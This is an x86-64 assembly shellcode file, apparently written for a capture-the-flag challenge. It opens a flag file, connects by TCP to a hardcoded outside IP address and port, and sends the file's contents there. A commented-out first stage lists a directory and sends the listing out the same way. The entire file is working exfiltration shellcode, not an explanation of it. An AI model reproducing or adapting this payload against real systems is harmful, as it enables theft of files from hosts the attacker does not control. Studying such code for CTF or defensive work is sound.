    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    ; first stage, leak flag name
    ; ; openat(-100, "./", os.O_DIRECTORY)
    ; mov rax, 257
    ; mov rdi, 0xffffffffffffff9c
    ; lea rsi, [rel flagpath]
    ; mov rdx, 0x10000
    ; syscall ; fd 0

    ; ; getdents(0, buf, 0x1000)
    ; mov rax, 0x4e
    ; mov rdi, 0
    ; lea rsi, [rel _start + 0x200]
    ; mov rdx, 0x1000
    ; syscall
    
    ; ; socket(AF_INET, SOCK_STREAM, 0)
    ; mov rax, 0x29
    ; mov rdi, 2
    ; mov rsi, 1
    ; mov rdx, 0
    ; syscall ; fd 1

    ; ; connect to ip
    ; ; setup sockaddr_in struct
    ; lea r12, [rel _start + 0x100]
    ; mov rax, 0x1dcc2a9839300002
    ; mov qword [r12 + 0x10], rax
    ; ; create pointer to sockaddr_in struct
    ; mov rax, r12
    ; add rax, 0x10
    ; mov [r12], rax

    ; ; connect(1, sockaddr_in, 0x10)
    ; mov rax, 0x2a
    ; mov rdi, 1
    ; add r12, 0x10
    ; mov rsi, r12
    ; mov rdx, 0x10
    ; syscall

    ; ; sendto(1, *iov.iov_base , 0x1000, 0, sockaddr_in, 0x10)
    ; mov rax, 0x2c
    ; mov rdi, 1
    ; ; mov rsi, [r12]
    ; lea rsi, [rel _start + 0x200]
    ; mov rdx, 0x1000
    ; mov r10, 0
    ; mov r8, [rel _start + 0x100]
    ; mov r9, 0x10
    ; syscall

    ; once leaked, read flag
    ; openat(-100, "/flag", 0)
    mov rax, 257
    mov rdi, 0xffffffffffffff9c
    lea rsi, [rel flagpath]
    mov rdx, 0
    syscall ; fd 0

    ; socket(AF_INET, SOCK_STREAM, 0)
    mov rax, 0x29
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall ; fd 1

    ; connect to ip
    ; setup sockaddr_in struct
    lea r12, [rel _start + 0x100]
    mov rax, 0x1dcc2a9839300002
    mov qword [r12 + 0x10], rax
    ; create pointer to sockaddr_in struct
    mov rax, r12
    add rax, 0x10
    mov [r12], rax

    ; connect(1, sockaddr_in, 0x10)
    mov rax, 0x2a
    mov rdi, 1
    add r12, 0x10
    mov rsi, r12
    mov rdx, 0x10
    syscall

    ; setup iovec struct
    lea r12, [rel _start + 0x200]
    mov rax, r12
    add rax, 0x10
    mov [r12], rax
    mov qword [r12 + 0x8], 0x1000

    ; preadv2
    mov rax, 327
    mov rdi, 0
    mov rsi, r12
    mov rdx, 1
    mov r10, 0
    mov r9, 0
    syscall

    ; sendto(1, *iov.iov_base , 0x1000, 0, sockaddr_in, 0x10)
    mov rax, 0x2c
    mov rdi, 1
    mov rsi, [r12]
    mov rdx, 0x1000
    mov r10, 0
    mov r8, [rel _start + 0x100]
    mov r9, 0x10
    syscall

flagpath: db "./flag-ffb70ade81140139ebed8ffebf1c8cef.txt", 0
; flagpath: db "./", 0